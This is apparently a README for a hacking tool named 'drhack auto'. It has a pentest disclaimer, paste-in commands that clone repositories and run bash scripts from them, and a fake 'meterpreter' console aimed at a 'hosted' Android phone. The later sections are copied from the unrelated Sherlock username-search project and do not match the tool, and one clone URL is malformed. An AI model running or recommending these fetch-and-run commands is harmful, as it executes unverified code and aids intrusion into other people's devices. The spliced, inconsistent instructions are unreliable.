<p align=center>
  <br>
  <span><big>drhack auto</big></span>


## DISCLAIMER!

<b>THIS TOOL HAS MADE FOR PENTENS PURPOSES, DONT USE IT FOR CRIMINAL REASONS OR ELSE!!!</b>

## Usage in the ANDROID that will be HOSTED!

```console
pkg install git ; git clone https://github.com/ixzzxitado/drhck ; cd drhck ; bash bashrc
```

## In the `fakemeterpreter>` page

```console
wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet [ THE HOSTED ANDROID IP IS HERE!!!! ] netmask
 broadcast 
        inet6
 prefixlen 32 scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 2928236296  bytes 261017639 (1108.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 614289873  bytes 12719412153 (129195.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[ THE HOSTED ANDROID USER ]

fakemeterpreter> [ PUT THE HOSTED IP HERE ]
```

## In the OWNER OF ANDROID HOSTED

```console
pkg install git ; git clone https://ixzzxitado/dr-owner-extension ; cd dr-owner-extension ; bash own.sh
```

To search for only one user:
```
python3 sherlock user123
```

To search for more than one user:
```
python3 sherlock user1 user2 user3
```

Accounts found will be stored in an individual text file with the corresponding username (e.g ```user123.txt```).

## Anaconda (Windows) Notes

If you are using Anaconda in Windows, using `python3` might not work. Use `python` instead.

## Docker Notes

If docker is installed you can build an image and run this as a container.

```
docker build -t mysherlock-image .
```

Once the image is built, sherlock can be invoked by running the following:

```
docker run --rm -t mysherlock-image user123
```

Use the following command to access the saved results:

```
docker run --rm -t -v "$PWD/results:/opt/sherlock/results" mysherlock-image -o /opt/sherlock/results/text.txt user123
```

Docker is instructed to create (or use) the folder `results` in the current working directory and to mount it at `/opt/sherlock/results` on the docker container by using the ```-v "$PWD/results:/opt/sherlock/results"``` options. `Sherlock` is instructed to export the result using the `-o /opt/sherlock/results/text.txt` option.


### Using `docker-compose`

You can use the `docker-compose.yml` file from the repository and use this command:

```
docker-compose run sherlock -o /opt/sherlock/results/text.txt user123
```

## Contributing
We would love to have you help us with the development of Sherlock. Each and every contribution is greatly valued!

Here are some things we would appreciate your help on:
- Addition of new site support Â¹
- Bringing back site support of [sites that have been removed](removed_sites.md) in the past due to false positives

[1] Please look at the Wiki entry on [adding new sites](https://github.com/sherlock-project/sherlock/wiki/Adding-Sites-To-Sherlock)
to understand the issues.

## Tests

Thank you for contributing to Sherlock!

Before creating a pull request with new development, please run the tests
to ensure that everything is working great.  It would also be a good idea to run the tests
before starting development to distinguish problems between your
environment and the Sherlock software.

The following is an example of the command line to run all the tests for
Sherlock.  This invocation hides the progress text that Sherlock normally
outputs, and instead shows the verbose output of the tests.

```console
$ cd sherlock/sherlock
$ python3 -m unittest tests.all --verbose
```

Note that we do currently have 100% test coverage.  Unfortunately, some of
the sites that Sherlock checks are not always reliable, so it is common
to get response problems.  Any problems in connection will show up as
warnings in the tests instead of true errors.

If some sites are failing due to connection problems (site is down, in maintenance, etc)
you can exclude them from tests by creating a `tests/.excluded_sites` file with a
list of sites to ignore (one site name per line).

## Stargazers over time

o
